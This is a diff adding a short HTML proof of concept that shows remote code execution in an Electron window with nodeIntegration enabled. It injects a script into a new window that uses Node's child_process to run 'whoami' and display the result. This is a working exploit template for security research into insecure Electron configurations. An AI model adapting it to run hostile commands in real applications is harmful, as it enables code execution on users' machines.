@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>RCE Proof of Concept</title>
+</head>
+<body>
+  <h1>Electron RCE PoC</h1>
+  <p>This window has access to Node.js bindings due to nodeIntegration: true.</p>
+  
+  <script>
+    document.write("<pre>process.platform: " + process.platform + "</pre>");
+
+    const payload = `
+      <h2>Injected Window</h2>
+      <pre id="output">Running command: whoami</pre>
+      <script>
+        const { exec } = require('child_process');
+        exec('whoami', (err, stdout, stderr) => {
+          document.getElementById('output').textContent += "\\n" + (stdout || err || stderr);
+        });
+      <\/script>
+    `;
+
+    const win = window.open('about:blank', '_blank');
+    win.document.write(payload);
+  </script>
+</body>
+</html>
